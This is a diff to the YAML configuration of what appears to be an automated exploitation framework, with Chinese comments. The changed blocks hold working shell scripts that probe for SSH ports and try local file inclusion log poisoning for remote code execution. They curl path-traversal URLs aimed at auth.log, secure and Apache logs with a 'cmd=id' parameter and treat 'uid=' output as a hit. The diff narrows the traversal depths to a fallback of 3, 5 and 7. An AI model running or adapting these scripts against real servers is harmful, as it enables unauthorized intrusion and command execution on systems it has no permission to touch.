@@ -310,6 +310,8 @@ probes:
   - id: check_ssh_port
     description: "检查 SSH 端口（用于日志注入），捕获真实端口号"
     depends_on: { lfi_confirmed: true }
+    skip_if:
+      variable_present: ssh_port
     command: |
       # 扫常见 SSH 端口，输出带标记便于正则捕获
       # 格式: SSH_PORT_OPEN:<port>
@@ -487,21 +489,24 @@ exploit_paths:
             fi
           done
 
-          for depth in 1 2 3 4 5 6 7 8 9 10; do
-            TRAV=$(printf '../%.0s' $(seq 1 $depth))
-            for logpath in var/log/auth.log var/log/secure var/log/sshd.log; do
-              for param in $PARAMS; do
-                URL="$BASE/?$param=${TRAV}${logpath}&cmd=id"
-                echo "[PROBE] $URL"
-                result=$(curl -s "$URL" --max-time 8 2>/dev/null)
-                if echo "$result" | grep -qE 'uid=[0-9]+'; then
-                  echo "[HIT] SSH_LOG_POISON_RCE:$param:$depth:$logpath"
-                  echo "$result" | grep "uid="
-                  exit 0
-                fi
+          if [ -z "$CONFIRMED_DEPTH" ] || [ "$CONFIRMED_DEPTH" = "0" ]; then
+            echo "[WARN] LFI depth 未确认，启用受控回退深度(3 5 7)"
+            for depth in 3 5 7; do
+              TRAV=$(printf '../%.0s' $(seq 1 $depth))
+              for logpath in var/log/auth.log var/log/secure var/log/sshd.log; do
+                for param in $PARAMS; do
+                  URL="$BASE/?$param=${TRAV}${logpath}&cmd=id"
+                  echo "[PROBE] $URL"
+                  result=$(curl -s "$URL" --max-time 8 2>/dev/null)
+                  if echo "$result" | grep -qE 'uid=[0-9]+'; then
+                    echo "[HIT] SSH_LOG_POISON_RCE:$param:$depth:$logpath"
+                    echo "$result" | grep "uid="
+                    exit 0
+                  fi
+                done
               done
             done
-          done
+          fi
           echo "SSH_LOG_POISON_FAILED"
         timeout: 90
         success_criteria:
@@ -562,21 +567,24 @@ exploit_paths:
             done
           fi
 
-          for depth in 1 2 3 4 5 6 7 8 9 10; do
-            TRAV=$(printf '../%.0s' $(seq 1 $depth))
-            for logpath in $LOGS; do
-              for param in $PARAMS; do
-                URL="$BASE/?$param=${TRAV}${logpath}&cmd=id"
-                echo "[PROBE] $URL"
-                result=$(curl -s "$URL" --max-time 8 2>/dev/null)
-                if echo "$result" | grep -qE 'uid=[0-9]+'; then
-                  echo "[HIT] APACHE_LOG_POISON_RCE:$param:$depth:$logpath"
-                  echo "$result" | grep "uid="
-                  exit 0
-                fi
+          if [ -z "$CONFIRMED_DEPTH" ] || [ "$CONFIRMED_DEPTH" = "0" ]; then
+            echo "[WARN] LFI depth 未确认，启用受控回退深度(3 5 7)"
+            for depth in 3 5 7; do
+              TRAV=$(printf '../%.0s' $(seq 1 $depth))
+              for logpath in $LOGS; do
+                for param in $PARAMS; do
+                  URL="$BASE/?$param=${TRAV}${logpath}&cmd=id"
+                  echo "[PROBE] $URL"
+                  result=$(curl -s "$URL" --max-time 8 2>/dev/null)
+                  if echo "$result" | grep -qE 'uid=[0-9]+'; then
+                    echo "[HIT] APACHE_LOG_POISON_RCE:$param:$depth:$logpath"
+                    echo "$result" | grep "uid="
+                    exit 0
+                  fi
+                done
               done
             done
-          done
+          fi
           echo "APACHE_LOG_POISON_FAILED"
         timeout: 90
         success_criteria:
